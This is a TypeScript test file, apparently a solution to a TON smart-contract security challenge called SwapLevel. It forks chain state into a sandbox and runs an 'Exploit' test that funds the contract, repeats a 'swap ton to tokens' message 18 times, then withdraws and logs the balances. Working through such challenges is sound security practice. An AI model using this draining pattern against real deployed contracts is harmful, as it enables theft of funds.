import {
    Blockchain,
    RemoteBlockchainStorage,
    SandboxContract,
    TreasuryContract,
    wrapTonClient4ForRemote,
} from '@ton/sandbox';
import '@ton/test-utils';
import { Address, fromNano, toNano } from '@ton/core';
import { TonClient4 } from '@ton/ton';
import { SwapLevel } from '../wrappers/wrappers/SwapLevel';
import { Token } from '../wrappers/wrappers/SwapLevelToken';

// npx blueprint test 7. SwapLevel.spec.ts
describe('SwapLevel', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<SwapLevel>;
    const level_addr = Address.parse('EQAFxm2YHjvO35vJ8WSjbTSuuZmjZY1_yljx1ZIJlcxPmv-4');
    let token: SandboxContract<Token>;

    let player: SandboxContract<TreasuryContract>;
    let owner: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create({
            storage: new RemoteBlockchainStorage(
                wrapTonClient4ForRemote(
                    new TonClient4({
                        endpoint: 'https://sandbox-v4.tonhubapi.com',
                    }),
                ),
            ),
        });
        player = await blockchain.treasury('player');
        owner = await blockchain.treasury('owner');

        level = blockchain.openContract(SwapLevel.fromAddress(level_addr));
        token = blockchain.openContract(
            Token.fromAddress(Address.parse('EQCMvcB8bGhdiQ0Txyr_w8-0Hz_kItu_8wePQ0qabANwqvVO')),
        );
    });

    it('Exploit', async () => {
        // await contract.send(player, { value: toNano('55') }, null);
        await level.send(player.getSender(), { value: toNano('55') }, null);
        for (let i = 0; i < 18; i++) {
            // await contract.send(player, { value: toNano('0.1') }, 'swap ton to tokens');
            await level.send(player.getSender(), { value: toNano('0.1') }, 'swap ton to tokens');
        }
        await getBalance();

        // await contract.send(player, { value: toNano('0.1') }, 'withdraw');
        await level.send(player.getSender(), { value: toNano('0.1') }, 'withdraw');

        await getBalance();

        console.log('Token Balance', fromNano(await token.getBalance()));
    });

    const getBalance = async () => {
        console.log(fromNano((await blockchain.getContract(level_addr)).balance));
    };
});
